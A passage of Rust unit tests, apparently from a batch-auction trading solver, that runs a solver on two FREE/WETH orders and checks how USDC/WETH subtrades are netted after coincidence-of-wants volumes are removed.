        let solution = solve(
            BatchAuctionModel {
                tokens: BTreeMap::from_iter(IntoIterator::into_iter([
                    (
                        free,
                        TokenInfoModel {
                            decimals: Some(18u8),
                            ..Default::default()
                        },
                    ),
                    (
                        weth,
                        TokenInfoModel {
                            decimals: Some(18u8),
                            ..Default::default()
                        },
                    ),
                ])),
                orders: BTreeMap::from_iter(IntoIterator::into_iter([
                    (1, free_weth_order.clone()),
                    (2, free_weth_order),
                ])),
                ..Default::default()
            },
            SlippageCalculator::default(),
        )
        .await
        .unwrap();

        println!("{:#?}", solution);
    }

    #[test]
    fn combines_subtrades_joint_token_pairs() {
        let usdc = H160(hex!("a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"));
        let weth = H160(hex!("c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"));

        let splitted_trade_amounts = get_splitted_trade_amounts_from_trading_vec(vec![
            SubTrade {
                src_token: usdc,
                dest_token: weth,
                src_amount: 7000000000_u128.into(),
                dest_amount: 6887861098514148915_u128.into(),
            },
            SubTrade {
                src_token: weth,
                dest_token: usdc,
                src_amount: 3979843491332154984_u128.into(),
                dest_amount: 4057081604_u128.into(),
            },
            SubTrade {
                src_token: weth,
                dest_token: usdc,
                src_amount: 4671990185476877589_u128.into(),
                dest_amount: 4759375562_u128.into(),
            },
        ]);

        let updated_traded_amounts =
            get_trade_amounts_without_cow_volumes(&splitted_trade_amounts).unwrap();

        assert_eq!(updated_traded_amounts.len(), 1);
        // Depending on the order that the subtrades are considered (which is
        // random because of `HashMap`), it can either sell excess WETH or USDC
        if updated_traded_amounts.contains_key(&(usdc, weth)) {
            assert_eq!(
                updated_traded_amounts,
                hashmap! {
                    (usdc, weth) => TradeAmount {
                        must_satisfy_limit_price: false,
                        sell_amount: (4057081604_u128
                                    + 4759375562_u128
                                    - 7000000000_u128).into(),
                        buy_amount: U256::zero(),
                    },
                }
            )
        } else {
            assert_eq!(
                updated_traded_amounts,
                hashmap! {
                    (weth, usdc) => TradeAmount {
                        must_satisfy_limit_price: false,
                        sell_amount: (3979843491332154984_u128
                                    + 4671990185476877589_u128
                                    - 6887861098514148915_u128).into(),
                        buy_amount: U256::zero(),
                    },
                }
            )
        }
    }
}
